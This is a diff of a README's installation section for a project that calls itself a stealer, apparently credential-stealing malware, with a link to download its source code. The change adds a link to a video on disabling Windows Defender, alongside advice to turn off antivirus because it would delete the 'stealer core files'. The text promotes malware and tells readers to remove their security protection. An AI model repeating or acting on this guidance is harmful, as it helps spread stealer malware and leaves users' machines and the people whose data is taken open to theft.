@@ -33,7 +33,8 @@
 ---
 
 ## Installation
-It is recommended that you disable your antivirus software before downloading, as Windows Defender will delete the stealer core files 
+- It is recommended that you disable your antivirus software before downloading, as Windows Defender will delete the stealer core files 
+- [How To Disable Windows Defender](https://www.youtube.com/watch?v=8qWfnsjI4rM)
 
 1. **Download the source code**  
    [Download .zip](https://github.com/zakocord/Astryrean/archive/refs/heads/main.zip)
